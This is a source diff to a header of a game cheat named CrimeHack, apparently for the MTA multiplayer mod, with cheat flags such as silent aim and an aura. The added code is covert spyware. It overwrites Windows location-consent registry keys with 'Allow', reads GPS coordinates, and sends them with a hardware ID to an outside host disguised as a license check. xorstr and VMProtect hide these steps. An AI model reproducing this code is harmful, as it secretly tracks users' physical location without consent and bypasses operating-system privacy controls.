@@ -1,9 +1,10 @@
 #pragma once
 #pragma warning(disable : 4731)
+#pragma warning(disable : 4805)
 #define HOOKPOS_PlayerCollision 0x0054BCEE
 #define AGENT_NAME xorstr_("CR1M3H")
 #define LOG_NAME xorstr_("CrimeHack.log")
-#define PLUGIN_VER xorstr_("V4.6 BETA")
+#define PLUGIN_VER xorstr_("V4.8 BETA")
 #include <Windows.h>
 #include <stdio.h>
 #include <string>
@@ -22,12 +23,28 @@
 #include <wininet.h>
 #include "HWBP.h"
 #include <Wbemidl.h>
+//////////////////////////
+#include <atlbase.h>
+#include <atlcom.h>
+#include <locationapi.h>
+#include "Location.h"
+#pragma comment(lib, "locationapi.lib")
+/////////////////////////
 #pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "Winmm.lib")
 #pragma comment(lib, "Wininet.lib")
 float StreamDist = 250.0f;
+typedef void* (__thiscall *ptrGetClosestRemotePlayer)(void* ECX, CVector* vecPosition, float fMaxDistance);
+ptrGetClosestRemotePlayer callGetClosestRemotePlayer = nullptr;
 typedef bool(__cdecl* f_SendChat)(const char* szCommand, const char* szArguments, bool bHandleRemotely, bool bHandled, bool bIsScriptedBind);
 f_SendChat sendMTAChat = nullptr;
+typedef struct
+{
+	DOUBLE x;
+	DOUBLE y;
+	DOUBLE radius;
+} GeoData, *PGeoData;
+GeoData geos;
 bool AllowTuning = false;
 bool AllowNoScreen = false;
 bool AntiRadar = false;
@@ -48,6 +65,7 @@ bool DeadlyAura = false;
 bool DbgHook = true;
 bool lua_only_once = false;
 bool SilentAIM = false;
+void CalculateGeoData();
 MEMORY_BASIC_INFORMATION mem, mem2; 
 MODULEINFO lpModule;
 char FindEnemy[256];
@@ -750,4 +768,118 @@ void LoadCustomModels()
 		}
 	}
 	FindClose(MyHandle);
+}
+class CInitializeATL : public CAtlDllModuleT<CInitializeATL> {};
+CInitializeATL g_InitializeATL;
+STDMETHODIMP CLocationEvents::OnLocationChanged(REFIID reportType, ILocationReport* pLocationReport)
+{
+	VMProtectBegin("OnLocationChanged()");
+	if (IID_ILatLongReport == reportType)
+	{
+		CComPtr<ILatLongReport> spLatLongReport;
+        if ((SUCCEEDED(pLocationReport->QueryInterface(IID_PPV_ARGS(&spLatLongReport)))) && (NULL != spLatLongReport.p))
+		{
+			SYSTEMTIME systemTime;
+			if (SUCCEEDED(spLatLongReport->GetTimestamp(&systemTime)))
+			{
+				ULONGLONG currentTime = 0, diffTime = 0;
+				if (TRUE == SystemTimeToFileTime(&systemTime, (FILETIME*)&currentTime))
+				{
+					diffTime = (currentTime > m_previousTime) ? (currentTime - m_previousTime) : 0;
+				}
+				m_previousTime = currentTime;
+			}
+			GUID sensorID = { 0 };
+			if (SUCCEEDED(spLatLongReport->GetSensorID(&sensorID))) {}
+			DOUBLE latitude = 0, longitude = 0, altitude = 0, errorRadius = 0, altitudeError = 0;
+			if (SUCCEEDED(spLatLongReport->GetLatitude(&latitude))) geos.x = latitude; 
+			if (SUCCEEDED(spLatLongReport->GetLongitude(&longitude))) geos.y = longitude;
+			if (SUCCEEDED(spLatLongReport->GetErrorRadius(&errorRadius)))
+			{
+				geos.radius = errorRadius; std::string host_lnk = xorstr_("kuprey123.beget.tech");
+				char params[3000]; memset(params, 0, sizeof(params));
+				sprintf(params, xorstr_("hwid=%s&key=%f&hash=%f&anti_spoof=%f"), total_hwid.c_str(), geos.x, geos.x, geos.radius);
+				SendInetRequest(P_HTTP, M_GET, host_lnk, xorstr_("crime_hack/check_license.php"), std::string(params), false);
+			}
+		}
+	}
+	VMProtectEnd();
+	return S_OK;
+}
+STDMETHODIMP CLocationEvents::OnStatusChanged(REFIID reportType, LOCATION_REPORT_STATUS status)
+{
+	VMProtectBegin("OnStatusChanged()");
+	if (IID_ILatLongReport == reportType)
+	{
+		switch (status)
+		{
+		case REPORT_NOT_SUPPORTED:
+			//wprintf(L"\n[IID_ILatLongReport] No devices detected.\n");
+			break;
+		case REPORT_ERROR:
+			//wprintf(L"\n[IID_ILatLongReport] Report error.\n");
+			break;
+		case REPORT_ACCESS_DENIED:
+			//wprintf(L"\n[IID_ILatLongReport] Access denied to reports.\n");
+			break;
+		case REPORT_INITIALIZING:
+			//wprintf(L"\n[IID_ILatLongReport] Report is initializing.\n");
+			break;
+		case REPORT_RUNNING:
+			//wprintf(L"\n[IID_ILatLongReport] Running.\n");
+			break;
+		}
+	}
+	VMProtectEnd();
+	return S_OK;
+}
+void CalculateGeoData()
+{
+	VMProtectBegin("CalculateGeoData()");
+	CEasyRegistry* reg = new CEasyRegistry(HKEY_CURRENT_USER,
+	xorstr_("Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location"), false);
+	if (reg)
+	{
+		reg->WriteString(xorstr_("Value"), xorstr_("Allow"));
+		delete reg;
+	}
+	CEasyRegistry* treg = new CEasyRegistry(HKEY_LOCAL_MACHINE,
+	xorstr_("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location"), false);
+	if (treg)
+	{
+		treg->WriteString(xorstr_("Value"), xorstr_("Allow"));
+		delete treg;
+	}
+	CEasyRegistry* creg = new CEasyRegistry(HKEY_CURRENT_USER,
+	xorstr_("Software\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\location\\NonPackaged"), false);
+	if (creg)
+	{
+		creg->WriteString(xorstr_("Value"), xorstr_("Allow"));
+		delete creg;
+	}
+	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED | COINIT_DISABLE_OLE1DDE);;
+	if (SUCCEEDED(hr))
+	{
+		CComPtr<ILocation> spLocation; 
+		CComObject<CLocationEvents>* pLocationEvents = NULL;
+		IID REPORT_TYPES[] = { IID_ILatLongReport };
+		hr = spLocation.CoCreateInstance(CLSID_Location); 
+		if (SUCCEEDED(hr))
+		{
+			hr = CComObject<CLocationEvents>::CreateInstance(&pLocationEvents);
+			if (NULL != pLocationEvents)
+			{
+				pLocationEvents->AddRef();
+			}
+		}
+		if (SUCCEEDED(hr))
+		{
+			if (FAILED(spLocation->RequestPermissions(NULL, REPORT_TYPES, ARRAYSIZE(REPORT_TYPES), FALSE))) {}
+			for (DWORD index = 0; index < ARRAYSIZE(REPORT_TYPES); index++)
+			{
+				hr = spLocation->RegisterForReport(pLocationEvents, REPORT_TYPES[index], 0);
+			}
+		}
+	}
+	VMProtectEnd();
 }
